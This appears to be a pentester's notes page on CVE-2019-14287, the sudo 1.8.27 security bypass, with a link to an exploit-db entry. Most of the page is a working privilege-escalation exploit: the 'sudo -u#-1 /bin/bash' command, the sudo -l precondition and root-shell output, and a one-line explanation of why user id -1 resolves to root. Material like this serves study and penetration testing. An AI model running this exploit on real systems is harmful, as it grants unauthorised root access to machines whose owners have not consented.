---
description: CVE 2019-14287
---

# Sudo 1.8.27 Security Bypass

{% embed url="https://www.exploit-db.com/exploits/47502" %}

{% code overflow="wrap" %}
```bash
sudo -l

# User hacker may run the following commands on kali:
#    (ALL, !root) /bin/bash 

# Exploit 

sudo -u#-1 /bin/bash

# root@kali:/home/hacker# id
# uid=0(root) gid=1000(hacker) groups=1000(hacker)
# root@kali:/home/hacker#

# Description: 
# Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv 
# -u#-1 returns as 0 which is root's id
```
{% endcode %}
